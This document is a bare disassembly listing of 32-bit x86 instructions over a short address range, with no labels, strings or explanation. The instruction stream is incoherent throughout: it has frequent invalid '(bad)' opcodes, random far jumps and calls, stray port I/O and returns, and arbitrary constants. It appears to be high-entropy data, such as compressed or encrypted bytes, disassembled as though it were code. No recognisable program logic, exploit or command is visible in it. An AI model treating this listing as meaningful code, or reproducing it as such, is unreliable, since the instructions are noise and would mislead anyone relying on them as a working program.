  41727a:	outs   dx,DWORD PTR ds:[esi]
  41727b:	push   ds
  41727c:	retf   0x15a7
  41727f:	outs   dx,BYTE PTR ds:[esi]
  417280:	imul   ebp,DWORD PTR [ebx],0xffd01df0
  417286:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417287:	ret    0xacc4
  41728a:	(bad)  
  41728b:	xchg   esi,eax
  41728c:	mov    edx,0x88ed2c8d
  417291:	in     al,0xd6
  417293:	scas   eax,DWORD PTR es:[edi]
  417294:	or     BYTE PTR [ebp+0x2d],ah
  417297:	mov    WORD PTR [edi-0x43129c41],?
  41729d:	retf   0xf37c
  4172a0:	cmp    BYTE PTR [ebp+0x57],ah
  4172a3:	arpl   WORD PTR [ecx+edi*8],si
  4172a6:	cdq    
  4172a7:	test   BYTE PTR [esi-0x7],ch
  4172aa:	push   eax
  4172ab:	div    DWORD PTR [ebx-0x173f90e5]
  4172b1:	add    BYTE PTR [edx+ecx*1+0x4a889a6d],ch
  4172b8:	jo     0x417291
  4172ba:	scas   eax,DWORD PTR es:[edi]
  4172bb:	xor    DWORD PTR [eax],esp
  4172bd:	pop    esp
  4172be:	and    al,0x31
  4172c0:	sub    BYTE PTR [edi-0x7b3798ef],cl
  4172c6:	inc    ecx
  4172c7:	push   esi
  4172c8:	xchg   edi,eax
  4172c9:	xchg   esi,eax
  4172ca:	mov    eax,0x3b826d48
  4172cf:	add    esp,eax
  4172d1:	ror    DWORD PTR [eax],cl
  4172d3:	xchg   edx,eax
  4172d4:	jge    0x41726b
  4172d6:	shl    BYTE PTR ds:[edx+0x26],0x2e
  4172db:	add    BYTE PTR [edi+0x4903f3ec],ah
  4172e1:	inc    ebx
  4172e2:	test   DWORD PTR [ecx],ebp
  4172e4:	inc    ebp
  4172e5:	iret   
  4172e6:	add    al,0x4a
  4172e8:	cmp    bl,ch
  4172ea:	retf   
  4172eb:	xor    eax,0x8ddac607
  4172f0:	pop    esi
  4172f1:	inc    eax
  4172f2:	dec    esi
  4172f3:	xchg   ebp,eax
  4172f4:	leave  
  4172f5:	jae    0x4172a9
  4172f7:	mov    al,ds:0xadbda471
  4172fc:	mov    dh,0x6e
  4172fe:	rcl    BYTE PTR [ebx],cl
  417300:	push   0x2d
  417302:	mov    eax,ds:0x778af5f1
  417307:	fwait
  417308:	jl     0x4172f0
  41730a:	dec    esi
  41730b:	push   esi
  41730c:	cmp    al,BYTE PTR [ebp-0x6f]
  41730f:	scas   eax,DWORD PTR es:[edi]
  417310:	mov    ds:0x491a7565,eax
  417315:	xor    bl,al
  417317:	lock xchg ecx,eax
  417319:	inc    eax
  41731a:	loop   0x41735c
  41731c:	lods   al,BYTE PTR ds:[esi]
  41731d:	out    0xe,eax
  41731f:	or     esp,DWORD PTR [eax+0x61149f0f]
  417325:	aaa    
  417326:	or     BYTE PTR [edi+ebp*4+0x464be3d2],0xc0
  41732e:	mov    dl,0x52
  417330:	and    al,0xc8
  417332:	sub    edi,DWORD PTR [ebp-0xdb5e987]
  417338:	ficomp WORD PTR [ebx+0x7b]
  41733b:	push   ss
  41733c:	fild   DWORD PTR [ebx-0x2d]
  41733f:	xor    BYTE PTR [ebx],0x5c
  417342:	sbb    bh,BYTE PTR [edi]
  417344:	mov    eax,ds:0x449ad607
  417349:	pop    eax
  41734a:	scas   eax,DWORD PTR es:[edi]
  41734b:	jo     0x417338
  41734d:	in     eax,dx
  41734e:	rcr    DWORD PTR [ebx+0x3ed6f716],cl
  417354:	jmp    FWORD PTR [ebx-0x2b]
  417357:	pop    ebp
  417358:	push   0x36d79ebf
  41735d:	outs   dx,BYTE PTR ds:[esi]
  41735e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41735f:	jb     0x41732a
  417361:	(bad)  
  417362:	pop    edx
  417363:	jno    0x41730f
  417365:	xor    BYTE PTR [edi-0x61],al
  417368:	dec    ecx
  417369:	cmp    eax,0x56bbdbb
  41736e:	sti    
  41736f:	dec    ebx
  417370:	out    dx,al
  417371:	jl     0x7146ed2c
  417377:	cs lock mov ecx,0x3e2ea22d
  41737e:	cmp    eax,0xd8456b8
  417383:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417384:	lock imul DWORD PTR [esi+0xef58ee0]
  41738b:	mov    ah,0x3d
  41738d:	inc    edi
  41738e:	xor    DWORD PTR [bx+di+0x7869],edi
  417393:	dec    ebp
  417394:	pop    eax
  417395:	fld    st(4)
  417397:	xchg   ah,ch
  417399:	test   BYTE PTR [ebx+0x42],dl
  41739c:	enter  0x489f,0x46
  4173a0:	and    DWORD PTR [ebp+0x63],0xbe63db62
  4173a7:	or     dh,BYTE PTR [ecx]
  4173a9:	sbb    ecx,DWORD PTR es:[eax+0x1600b86f]
  4173b0:	(bad)  
  4173b1:	mov    ah,0x96
  4173b3:	out    dx,al
  4173b4:	(bad)  
  4173b5:	xchg   edi,eax
  4173b6:	mov    al,ds:0xb3425623
  4173bb:	push   eax
  4173bc:	sub    ebp,DWORD PTR [edi]
  4173be:	imul   ebp,ebx,0xdd5f8d45
  4173c4:	pop    edx
  4173c5:	xor    DWORD PTR [ecx],esi
  4173c7:	outs   dx,BYTE PTR ds:[esi]
  4173c8:	out    0x1f,al
  4173ca:	cmp    DWORD PTR [edx-0x1578fa6],ecx
  4173d0:	outs   dx,BYTE PTR ds:[esi]
  4173d1:	ins    DWORD PTR es:[edi],dx
  4173d2:	pop    ebx
  4173d3:	inc    ecx
  4173d4:	push   es
  4173d5:	aaa    
  4173d6:	inc    BYTE PTR [ebp+0x7e]
  4173d9:	stos   DWORD PTR es:[edi],eax
  4173da:	push   eax
  4173db:	inc    edx
  4173dc:	mov    bl,0xcc
  4173de:	cwde   
  4173df:	mov    cs,WORD PTR [ecx-0x6f]
  4173e2:	lock pushf 
  4173e4:	inc    edi
  4173e5:	data16 (bad) 
  4173e7:	sbb    DWORD PTR [edx+0x1d6a082],esi
  4173ed:	and    eax,0xd009db7
  4173f2:	xor    al,0xfa
  4173f4:	fidiv  WORD PTR [esi+ebx*4-0x69cebfb8]
  4173fb:	dec    edi
  4173fc:	gs cmp al,0xa
  4173ff:	cmp    edx,eax
  417401:	jp     0x4173ae
  417403:	adc    ecx,ebx
  417405:	sub    eax,0xa17e2a81
  41740a:	lock mov eax,0xf5a3702a
  417410:	push   ecx
  417411:	repnz mov al,ds:0xe925a9a9
  417417:	sub    al,0xa8
  417419:	xor    esi,DWORD PTR [eax+0x307b75fd]
  41741f:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  417421:	scas   al,BYTE PTR es:[edi]
  417422:	int3   
  417423:	or     edi,DWORD PTR [edi]
  417425:	mov    edi,0xb2d0852
  41742a:	call   0xc9acc383
  41742f:	call   0xd5f0:0x45a49bd0
  417436:	lods   eax,DWORD PTR ds:[esi]
  417437:	std    
  417438:	add    eax,DWORD PTR [edx+edx*4]
  41743b:	ins    BYTE PTR es:[edi],dx
  41743c:	or     BYTE PTR [eax-0x9],ch
  41743f:	cmp    DWORD PTR [edx-0x51],edi
  417442:	cli    
  417443:	daa    
  417444:	(bad)  
  417447:	(bad)  
  417448:	std    
  417449:	jae    0x41746c
  41744b:	pop    ecx
  41744c:	les    esp,FWORD PTR [edi+eiz*2-0xacc758d]
  417453:	or     eax,0xd60839a3
  417458:	loopne 0x41744c
  41745a:	jnp    0x4173fd
  41745c:	push   ds
  41745d:	sbb    DWORD PTR [ebx-0x6a],ebp
  417460:	daa    
  417461:	push   esp
  417462:	ror    DWORD PTR [ecx-0x67],1
  417465:	xor    al,BYTE PTR [ebx+0x3a]
  417468:	test   BYTE PTR [esi+ebp*2],ah
  41746b:	mov    esi,0x515ba968
  417470:	aas    
  417471:	or     DWORD PTR [edx-0x14],ecx
  417474:	ror    BYTE PTR ds:[edi+0x58009cac],1
  41747b:	and    DWORD PTR [eax],ecx
  41747d:	pop    ecx
  41747e:	rcl    BYTE PTR [eax-0x51448568],1
  417484:	push   edx
  417485:	clc    
  417486:	mov    esi,0x79c4ee3f
  41748b:	push   ds
  41748c:	imul   edx,DWORD PTR [edi-0x176ec8e1],0xffffffdc
  417493:	pop    ecx
  417494:	aas    
  417495:	mov    ah,0xb
  417497:	sbb    BYTE PTR [edi-0xeacfd80],al
  41749d:	(bad)
  4174a0:	mov    cl,0xc5
  4174a2:	enter  0x46c9,0x3a
  4174a6:	iret   
  4174a7:	call   0xcdcc09e5
  4174ac:	cmp    BYTE PTR [edx+eiz*1+0x67],0xd3
  4174b1:	cmp    BYTE PTR [edi+ecx*4],0x19
  4174b5:	inc    ebx
  4174b6:	test   eax,0x95543137
  4174bb:	loopne 0x4174a8
  4174bd:	cmp    al,0x43
  4174bf:	push   eax
  4174c0:	test   eax,0x7aca0dde
  4174c5:	xor    BYTE PTR [ebx],bh
  4174c7:	test   al,0x96
  4174c9:	sub    BYTE PTR [edi+0x63],ch
  4174cc:	daa    
  4174cd:	sub    eax,0xe629f4d5
  4174d2:	test   BYTE PTR ds:[ebx],cl
  4174d5:	in     al,dx
  4174d6:	adc    al,0x6c
  4174d8:	test   ch,ch
  4174da:	mov    ah,0x27
  4174dc:	fwait
  4174dd:	xor    BYTE PTR ds:[ebp+eiz*4-0xa84340b],0x6e
  4174e6:	mov    esi,DWORD PTR [edi+esi*8+0x59c9a9e6]
  4174ed:	pusha  
  4174ee:	jns    0x417542
  4174f0:	dec    ebp
  4174f1:	lods   eax,DWORD PTR ds:[esi]
  4174f2:	test   DWORD PTR [edi+esi*8+0x4b27e2b5],edi
  4174f9:	bound  esp,QWORD PTR [ecx]
  4174fb:	enter  0xecba,0xb1
  4174ff:	mov    al,ds:0x422be2b3
  417504:	mov    dl,0xea
  417506:	adc    al,0x3c
  417508:	inc    ebx
  417509:	popf   
  41750a:	cmp    al,0xe9
  41750c:	push   ss
  41750d:	aad    0xb3
  41750f:	mov    esp,0xf8d6ff43
  417514:	jno    0x417522
  417516:	outs   dx,DWORD PTR ds:[esi]
  417517:	fsub   QWORD PTR [edi+edi*2]
  41751a:	pushf  
  41751b:	push   ss
  41751c:	test   al,0x1c
  41751e:	js     0x417591
  417520:	mov    esp,0x509f8d59
  417525:	dec    edx
  417526:	dec    edx
  417527:	rcl    BYTE PTR [edi],cl
  417529:	mov    ch,0x6b
  41752b:	mov    BYTE PTR [edi+eiz*8-0x4],ah
  41752f:	in     eax,0x6c
  417531:	lods   eax,DWORD PTR ds:[esi]
  417532:	cmp    edi,edi
  417534:	dec    esp
  417535:	imul   esp,DWORD PTR [esi],0x496f45cd
  41753b:	cld    
  41753c:	and    dh,BYTE PTR [esp+eiz*8+0x7a80e07a]
  417543:	cdq    
  417544:	mov    ?,WORD PTR [edi+0x48]
  417547:	fwait
  417548:	in     al,dx
  417549:	fdiv   QWORD PTR [ebp-0x15]
  41754c:	test   al,0x9b
  41754e:	fldcw  WORD PTR [ecx]
  417550:	jns    0x41758a
  417552:	lea    ebp,[edx]
  417554:	pusha  
  417555:	fbstp  TBYTE PTR [eax+0x27]
  417558:	mov    edx,0x4479383a
  41755d:	xor    al,0x35
  41755f:	mov    eax,0x43d1ba63
  417564:	cmp    DWORD PTR [ebp-0x3577c5c],edx
  41756a:	add    BYTE PTR [esi+0x2b3b0bda],0x35
  417571:	lea    edx,[ebx-0x31]
  417574:	dec    esi
  417575:	sbb    esp,eax
  417577:	bound  esi,QWORD PTR [edx]
  417579:	aam    0x48
  41757b:	sub    al,0xc9
  41757d:	ret    0x7fc3
  417580:	dec    eax
  417581:	ins    DWORD PTR es:[edi],dx
  417582:	js     0x417515
  417584:	mov    cl,BYTE PTR [ebx+0x6569c7f3]
  41758a:	mov    edx,0xb4f39912
  41758f:	out    dx,al
  417590:	bound  esp,QWORD PTR [esi+0x7a]
  417593:	test   al,0xb1
  417595:	and    ebp,DWORD PTR [ecx-0x37f0ac3b]
  41759b:	sar    BYTE PTR [esi-0x7a88befa],0xaf
  4175a2:	add    al,0xa7
  4175a4:	ins    DWORD PTR es:[edi],dx
  4175a5:	mov    ebp,0xc4e0b9f5
  4175aa:	into   
  4175ab:	mov    dl,0xb9
  4175ad:	adc    BYTE PTR [edi-0x3dc6008f],0x29
  4175b4:	inc    esp
  4175b5:	sti    
  4175b6:	pop    ss
  4175b7:	repnz mov bh,0xff
  4175ba:	add    al,0x1f
  4175bc:	neg    BYTE PTR [ebx+0x34]
  4175bf:	vpsrlq ymm0,ymm3,XMMWORD PTR [ebx]
  4175c3:	and    ebp,ecx
  4175c5:	pop    eax
  4175c6:	jecxz  0x4175f6
  4175c8:	or     DWORD PTR [ebx],0xffffffcd
  4175cb:	mov    ebp,0x9fe36ff8
  4175d0:	adc    BYTE PTR [edx-0x31b0d26],cl
  4175d6:	mov    ebx,0xb89be83
  4175db:	xchg   ecx,eax
  4175dd:	lods   al,BYTE PTR ds:[esi]
  4175de:	sbb    BYTE PTR [esi+0x475d31cd],cl
  4175e4:	popa   
  4175e5:	fdivr  DWORD PTR [edi]
  4175e7:	fadd   QWORD PTR [edx-0x75945a14]
  4175ed:	js     0x417611
  4175ef:	ins    BYTE PTR es:[edi],dx
  4175f0:	sar    dh,1
  4175f2:	(bad)  
  4175f3:	pop    es
  4175f4:	cmp    dl,dh
  4175f6:	mov    bl,0xf6
  4175f8:	mov    ah,0xd9
  4175fa:	fmul   QWORD PTR [eax+0x59]
  4175fd:	call   0x2ad17b5f
  417602:	or     BYTE PTR [esi+0x1d],cl
  417605:	pop    esp
  417606:	push   es
  417607:	sbb    al,0x2a
  417609:	rcr    BYTE PTR [ebp-0x56],0x90
  41760d:	dec    esp
  41760e:	and    dh,BYTE PTR [ecx-0x7b]
  417611:	popf   
  417612:	and    ebx,DWORD PTR [edx]
  417614:	loope  0x417693
  417616:	sbb    DWORD PTR [ebp-0x6935e746],0x2ccdc8ae
  417620:	mov    ebp,0x8a21140d
  417625:	sbb    edi,DWORD PTR [ebp+0x1decfe8d]
  41762b:	mov    ds:0x9a844e84,al
  417630:	push   0xffffffaa
  417632:	xchg   ebx,eax
  417633:	bound  ecx,QWORD PTR [eax+0x51]
  417636:	rol    DWORD PTR ds:0xb87fa332,1
  41763c:	mov    al,0xf4
  41763e:	pop    es
  41763f:	xor    al,0xfa
  417641:	xchg   ecx,eax
  417642:	pop    DWORD PTR [edi]
  417644:	(bad)  
  417646:	jbe    0x417663
  417648:	jne    0x417628
  41764a:	jp     0x417699
  41764c:	jmp    0x31bd:0x4f8f1aad
  417653:	xchg   ebx,eax
  417654:	dec    esi
  417655:	mov    dl,BYTE PTR [ecx+0x3a]
  417658:	inc    ecx
  417659:	scas   eax,DWORD PTR es:[edi]
  41765a:	xor    BYTE PTR [ecx],bl
  41765c:	and    ax,0xda5e
  417660:	jnp    0x41768c
  417662:	mov    ds:0x6c9f644c,al
  417667:	int    0x54
  417669:	sub    eax,DWORD PTR [esi+0x37]
  41766c:	sub    esi,esi
  41766e:	push   es
  41766f:	lock test BYTE PTR [ebx-0x3a],0x2d
  417674:	add    bh,BYTE PTR [edi+0x72]
  417677:	add    al,0xdd
  417679:	outs   dx,BYTE PTR ss:[esi]
  41767b:	jmp    0x7a53fe00
  417680:	xchg   esi,eax
  417681:	retf   0x8b6f
  417684:	push   ds
  417685:	out    dx,eax
  417686:	int3   
  417687:	dec    ecx
  417688:	or     BYTE PTR [edx],ah
  41768a:	cs sub al,0x88
  41768d:	pop    edi
  41768e:	sub    cl,BYTE PTR [edx+edi*2+0x5c75cf09]
  417695:	push   ds
  417696:	push   eax
  417697:	cs int3 
  417699:	arpl   di,sp
  41769b:	mov    dl,0x73
  41769d:	sar    BYTE PTR [edx],0xb9
  4176a0:	inc    edi
  4176a1:	xlat   BYTE PTR ds:[ebx]
  4176a2:	ins    DWORD PTR es:[edi],dx
  4176a3:	in     al,dx
  4176a4:	(bad)  
  4176a5:	cmc    
  4176a6:	fdivr  QWORD PTR cs:[eax]
  4176a9:	lds    ecx,FWORD PTR [ebp+0x60]
  4176ac:	mov    eax,ds:0x126b9bc1
  4176b1:	jns    0x41765b
  4176b3:	repz sub edi,DWORD PTR [edx]
  4176b6:	repz ret 
  4176b8:	hlt    
  4176b9:	mov    ah,0xb2
  4176bb:	loope  0x41766c
  4176bd:	inc    edi
  4176be:	xchg   ebp,eax
  4176bf:	jp     0x4176ba
  4176c1:	or     DWORD PTR [edx],edi
  4176c3:	retf   
  4176c4:	ja     0x417716
  4176c6:	sub    al,0x74
  4176c8:	jge    0x41769c
  4176ca:	push   ds
  4176cb:	in     eax,dx
  4176cc:	retf   
  4176cd:	(bad)  
  4176ce:	mov    ah,BYTE PTR [esi-0x9]
  4176d1:	test   eax,0x92cf8ec8
  4176d6:	jmp    0xf6d1:0xfc5b1628
  4176dd:	loopne 0x4176cd
  4176df:	das    
  4176e0:	ins    BYTE PTR es:[edi],dx
  4176e1:	mov    ecx,0x8725396e
  4176e6:	bound  ebx,QWORD PTR [edi+0x23]
  4176e9:	add    eax,0xd4e9d5a6
  4176ee:	out    dx,al
  4176ef:	rcl    DWORD PTR [ecx],1
  4176f1:	push   0x1f4f4cf2
  4176f6:	and    eax,DWORD PTR [esi-0x44]
  4176f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176fa:	xchg   esp,eax
  4176fb:	cmp    BYTE PTR [eax],ah
  4176fd:	sti    
  4176fe:	mov    ds:0x43fd86ce,al
  417703:	aad    0x61
  417705:	hlt    
  417706:	jb     0x41775e
  417708:	or     al,0x3a
  41770a:	ret    
  41770b:	arpl   WORD PTR [edx],bp
  41770d:	ss dec esp
  41770f:	rol    DWORD PTR [ebx],0xd1
  417712:	cmp    esp,DWORD PTR [ecx-0x215efc90]
  417718:	sbb    BYTE PTR [ebx+0x70],0x25
  41771c:	not    DWORD PTR [esi]
  41771e:	std    
  41771f:	mov    dl,0xd7
  417721:	dec    ecx
  417722:	jo     0x4176bb
  417724:	sbb    BYTE PTR [ebx],ah
  417726:	or     dh,BYTE PTR [ebp+0x3f5d650f]
  41772c:	(bad)  
  41772d:	sub    esi,esi
  41772f:	popf   
  417730:	call   0xd4d7:0x958de41a
  417737:	cmp    eax,0x810be828
  41773c:	inc    esp
  41773d:	add    cl,dl
  41773f:	inc    edi
  417740:	pusha  
  417741:	(bad)
  417744:	pop    ds
  417745:	inc    edx
  417746:	iret   
  417747:	rol    DWORD PTR [ebp+eax*8+0x6d04c0fe],0xf5
  41774f:	retf   
  417750:	mov    esp,0x27581f54
  417755:	mov    ch,0x46
  417757:	ficom  WORD PTR [ebx]
  417759:	mov    esi,0x7f149f83
  41775e:	test   DWORD PTR [eax-0x1c],ebp
  417761:	addr16 mov esp,0x9e501dcb
  417767:	stos   BYTE PTR es:[edi],al
  417768:	push   ebp
  417769:	dec    esi
  41776a:	mov    eax,ds:0x9990f4ac
  41776f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417770:	jae    0x417777
  417772:	jg     0x4177c1
  417774:	push   0xe3daa875
  417779:	pusha  
  41777a:	adc    BYTE PTR [edx],al
  41777c:	push   eax
  41777d:	repz mov ebx,0x419c1385
  417783:	xor    al,0xd2
  417785:	xchg   ch,dl
  417787:	into   
  417788:	retf   0xaf17
  41778b:	ss daa 
  41778d:	retf   
  41778e:	out    0x4f,al
  417790:	xchg   ebx,eax
  417791:	arpl   di,si
  417793:	sub    al,0xaf
  417795:	jp     0x417772
  417797:	xchg   edi,eax
  417798:	sbb    eax,0x123bca3f
  41779d:	fwait
  41779e:	push   edi
  41779f:	pusha  
  4177a0:	in     al,dx
  4177a1:	jmp    0x4177d5
  4177a3:	out    0xb9,eax
  4177a5:	aaa    
  4177a6:	xor    al,0x85
  4177a8:	in     al,dx
  4177a9:	(bad)  [esi+0x3b]
  4177ac:	add    eax,0xc050a91a
  4177b1:	mov    esp,0xae904096
  4177b6:	shl    DWORD PTR [ebx],0x3b
  4177b9:	mov    cl,0xf1
  4177bb:	lahf   
  4177bc:	fbld   TBYTE PTR [esi-0x12]
  4177bf:	lock ror DWORD PTR ds:0x127e4824,1
  4177c6:	mov    ebx,0xfa045ae0
  4177cb:	push   cs
  4177cc:	cmp    eax,0x4d4168a6
  4177d1:	and    DWORD PTR [ecx],esi
  4177d3:	imul   esi,eax,0x7c0b42c7
  4177d9:	enter  0x2e3f,0x77
  4177dd:	fwait
  4177de:	inc    BYTE PTR [ecx+0x5e]
  4177e1:	rcr    eax,1
  4177e3:	(bad)  
  4177e4:	call   0x422fac31
  4177e9:	aaa    
  4177ea:	shr    BYTE PTR [edx],0xc
  4177ed:	jns    0x417809
  4177ef:	jg     0x4177fc
  4177f1:	push   0xeccf316f
  4177f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177f7:	outs   dx,DWORD PTR ds:[esi]
  4177f8:	inc    eax
  4177f9:	xchg   esi,eax
  4177fa:	fld    DWORD PTR [ecx]
  4177fc:	es cmp esp,ebx
  4177ff:	mov    ecx,DWORD PTR [edx-0x3a92b9c8]
  417805:	inc    eax
  417806:	pop    ebx
  417807:	ins    BYTE PTR es:[edi],dx
  417808:	push   cs
  417809:	mov    al,ds:0xfc0322ce
  41780e:	gs xor edi,ebp
  417811:	adc    BYTE PTR [ecx+ecx*8+0x40],0xa1
  417816:	xor    dl,BYTE PTR [ebp-0x12]
  417819:	mov    bh,0xbc
  41781b:	add    al,0xbc
  41781d:	jmp    0x88219de3
  417822:	call   DWORD PTR [ebx-0x5d]
  417825:	repnz stos BYTE PTR es:[edi],al
  417827:	test   DWORD PTR [ebx-0x2e3d38e],ebx
  41782d:	scas   eax,DWORD PTR es:[edi]
  41782e:	fwait
  41782f:	jbe    0x417803
  417831:	retf   
  417832:	ret    
  417833:	sub    ch,al
  417835:	lock call 0xd2b446f9
  41783b:	push   0xffffff99
  41783d:	jmp    0x78152bf7
  417842:	push   ecx
  417843:	push   ecx
  417844:	scas   al,BYTE PTR es:[edi]
  417845:	sar    BYTE PTR [edx-0x23],cl
  417848:	pop    ebx
  417849:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41784a:	cld    
  41784b:	daa    
  41784c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41784d:	xor    ebp,DWORD PTR [ebx]
  41784f:	and    DWORD PTR [ecx+0x42ade809],esi
  417855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417856:	dec    esp
  417857:	ins    DWORD PTR es:[edi],dx
  417858:	push   0xfffffff5
  41785a:	mov    dh,0x64
  41785c:	mov    edi,0xf9690ca6
  417861:	xchg   edx,eax
  417862:	dec    esp
  417863:	ss iret 
  417865:	fimul  DWORD PTR ss:0x9161d333
  41786c:	out    dx,al
  41786d:	add    esi,DWORD PTR [edi]
  41786f:	jmp    FWORD PTR [edi]
  417871:	dec    esi
  417872:	ret    0x6c7
  417875:	jmp    0x6194:0x3327421b
  41787c:	aad    0x5a
  41787e:	mov    edi,0x8cf3a7e5
  417883:	enter  0x9397,0x3c
  417887:	mov    ds,eax
  417889:	fcom   QWORD PTR [ebx-0x430e1c47]
  41788f:	(bad)  
  417890:	sbb    al,0xfe
  417892:	add    bh,bh
  417894:	das    
  417895:	mov    ds:0x4b4f02cd,eax
  41789a:	inc    esp
  41789b:	std    
  41789c:	loop   0x417828
  41789e:	fnstcw WORD PTR [ebx-0x48]
  4178a1:	inc    esi
  4178a2:	clc    
  4178a3:	xor    ecx,DWORD PTR [edi+0x75]
  4178a6:	imul   ebx,DWORD PTR [ebx],0xffffffbf
  4178a9:	mov    ah,0x5a
  4178ab:	clc    
  4178ac:	jge    0x4178ff
  4178ae:	push   ebx
  4178af:	aam    0xb6
  4178b1:	add    ebx,eax
  4178b3:	cdq    
  4178b4:	pop    ds
  4178b5:	test   al,0xf0
  4178b7:	out    dx,al
  4178b8:	arpl   WORD PTR [ebp-0x49],si
  4178bb:	std    
  4178bc:	sub    edi,eax
  4178be:	loope  0x417880
  4178c0:	jo     0x417928
  4178c2:	cmp    esp,DWORD PTR [edi]
  4178c4:	dec    ebp
  4178c5:	in     al,dx
  4178c6:	inc    ebp
  4178c7:	pop    esi
  4178c9:	pushf  
  4178ca:	retf   0x256b
  4178cd:	retf   0x849b
  4178d0:	inc    esi
  4178d1:	mov    bl,0xeb
  4178d3:	mov    esi,ecx
  4178d5:	xchg   ebp,eax
  4178d6:	stc    
  4178d7:	call   0x9e6a:0x2d9cb919
  4178de:	inc    esi
  4178df:	mov    bl,BYTE PTR [ebx+0x7f3040eb]
  4178e5:	shl    BYTE PTR [ebp+0x78],0x73
  4178e9:	push   ebp
  4178ea:	xchg   edi,eax
  4178eb:	mov    esi,0x6380a67f
  4178f0:	jb     0x41794c
  4178f2:	daa    
  4178f3:	mov    dl,0x6b
  4178f5:	push   edi
  4178f6:	mov    al,ds:0x21d66001
  4178fb:	sub    eax,DWORD PTR es:[eax+0x6a]
  4178ff:	(bad)  
  417900:	(bad)  
  417901:	jnp    0x41794f
  417903:	out    dx,al
  417904:	jl     0x417965
  417906:	cmc    
  417907:	int3   
  417908:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41790a:	ret    
  41790b:	dec    eax
  41790c:	in     al,0xa7
  41790e:	add    al,BYTE PTR [ebx-0x18]
  417911:	adc    eax,0xe7d9dd4
  417916:	inc    edi
  417917:	lahf   
  417918:	xchg   ecx,eax
  417919:	ds scas eax,DWORD PTR es:[edi]
  41791b:	pop    ds
  41791c:	jle    0x4178c4
  41791e:	inc    edx
  41791f:	cli    
  417920:	or     eax,DWORD PTR [ebp-0x5a]
  417923:	jb     0x4178b8
  417925:	mov    edx,DWORD PTR [eax+0x58]
  417928:	sub    al,0xc7
  41792a:	xchg   esp,eax
  41792b:	xchg   edx,eax
  41792c:	sti    
  41792d:	push   ds
  41792e:	and    bh,BYTE PTR [esp+ecx*4-0x6f38be27]
  417935:	ins    DWORD PTR es:[edi],dx
  417936:	retf   0x142f
  417939:	push   edx
  41793a:	bound  edi,QWORD PTR [edi-0x4b2fa890]
  417940:	push   ebp
  417941:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417942:	inc    esp
  417943:	mov    esi,0x133d4ba8
  417948:	adc    DWORD PTR [esi+0x772391e3],ebp
  41794e:	sbb    BYTE PTR [ebp-0x4013906d],0xb1
  417955:	ror    BYTE PTR [edx+ecx*8+0x4c7891db],0x4e
  41795d:	jns    0x417926
  41795f:	jg     0x4178f4
  417961:	int3   
  417962:	xchg   ebx,eax
  417963:	push   ebp
  417964:	bound  ebx,QWORD PTR ds:0x2c6c6798
  41796a:	pop    edi
  41796b:	push   ds
  41796c:	mov    ds:0xab37e7ac,eax
  417971:	jns    0x4179bf
  417973:	test   DWORD PTR [edi-0x77b9e958],edi
  417979:	repz sar dl,cl
  41797c:	sti    
  41797d:	std    
  41797e:	push   ebp
  41797f:	fs inc ebx
  417981:	dec    ebp
  417982:	add    BYTE PTR [eax],bl
  417984:	bound  ebp,QWORD PTR [eax+0x3f]
  417987:	popa   
  417988:	cwde   
  417989:	arpl   WORD PTR [eax],bp
  41798b:	or     bl,BYTE PTR [ebx+ecx*8]
  41798e:	add    ch,BYTE PTR [ebx-0x62]
  417991:	ror    BYTE PTR [esi-0x47],1
  417994:	mov    dl,0x15
  417996:	scas   al,BYTE PTR es:[edi]
  417997:	(bad)  
  417998:	sti    
  417999:	pop    ecx
  41799a:	dec    eax
  41799b:	adc    cl,BYTE PTR [ebx+0x152a294d]
  4179a1:	(bad)  
  4179a2:	cmp    ebp,ebx
  4179a4:	std    
  4179a5:	rol    al,1
  4179a7:	stos   BYTE PTR es:[edi],al
  4179a8:	xor    ebp,DWORD PTR [edi+0x69]
  4179ab:	push   ss
  4179ac:	(bad)  
  4179ad:	xor    al,0x4c
  4179af:	stc    
  4179b0:	popa   
  4179b1:	mov    ds:0xaa1e224f,al
  4179b6:	or     DWORD PTR [ecx+0x3d],ebp
  4179b9:	pop    ecx
  4179ba:	dec    edi
  4179bb:	stos   BYTE PTR es:[edi],al
  4179bc:	xchg   esi,eax
  4179bd:	icebp  
  4179be:	cmp    ch,al
  4179c0:	mov    ebx,ds
  4179c2:	aaa    
  4179c3:	loopne 0x41794c
  4179c5:	shl    BYTE PTR [edx],1
  4179c7:	sub    BYTE PTR [edx+0x20de765],0xd0
  4179ce:	cld    
  4179cf:	add    cl,BYTE PTR [eax-0x1b9d4fb8]
  4179d5:	add    ch,bh
  4179d7:	mov    bh,BYTE PTR [eax]
  4179d9:	shl    DWORD PTR ds:0x29d78b5a,cl
  4179df:	jno    0x4179e4
  4179e1:	cmc    
  4179e2:	out    dx,al
  4179e3:	cwde   
  4179e4:	popf   
  4179e5:	dec    esi
  4179e6:	cmc    
  4179e7:	cdq    
  4179e8:	xor    ebx,DWORD PTR [ebp-0xb]
  4179eb:	sub    DWORD PTR [edi-0x32ab4c3f],ebp
  4179f1:	arpl   WORD PTR ss:0x3bceb00,si
  4179f8:	or     cl,BYTE PTR [ebx+0x3095a43f]
  4179fe:	lock add cl,BYTE PTR [eax-0x41b06c97]
  417a05:	fs scas al,BYTE PTR es:[edi]
  417a07:	push   ss
  417a08:	mov    esi,cs
  417a0a:	and    DWORD PTR [ebx-0x5f],ebp
  417a0d:	retf   
  417a0e:	sbb    eax,0x497729f3
  417a13:	int3   
  417a14:	imul   DWORD PTR [edx+0x37]
  417a17:	pop    ebx
  417a18:	mov    al,BYTE PTR [eax-0x1]
  417a1b:	sti    
  417a1c:	dec    esp
  417a1d:	push   eax
  417a1e:	test   al,0xe7
  417a20:	dec    edi
  417a21:	jmp    edx
  417a23:	fidivr WORD PTR [eax]
  417a25:	xor    DWORD PTR [edx+eiz*2-0x3b595a94],edx
  417a2c:	rol    DWORD PTR [edx+ebx*8+0x5f],1
